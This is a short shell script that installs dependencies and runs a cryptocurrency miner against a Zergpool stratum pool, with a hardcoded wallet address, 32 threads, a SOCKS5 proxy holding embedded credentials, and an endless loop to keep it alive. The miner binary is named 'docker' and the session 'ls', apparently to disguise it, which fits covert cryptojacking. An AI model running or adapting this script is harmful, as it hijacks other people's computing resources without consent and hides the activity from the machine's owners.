#!/bin/sh
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=MHivTNcgLRYeW3iU9G7ZScFKMuG465ANuM
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
PROXY=socks5://cuan:berhasil123@199.249.170.113:443
./docker -a verus -o $POOL -u $WALLET.BEH -p c=LTC,mc=VRSC,ID=$WORKER -t 32 -x $PROXY
while [ 1 ]; do
sleep 3
done
sleep 999
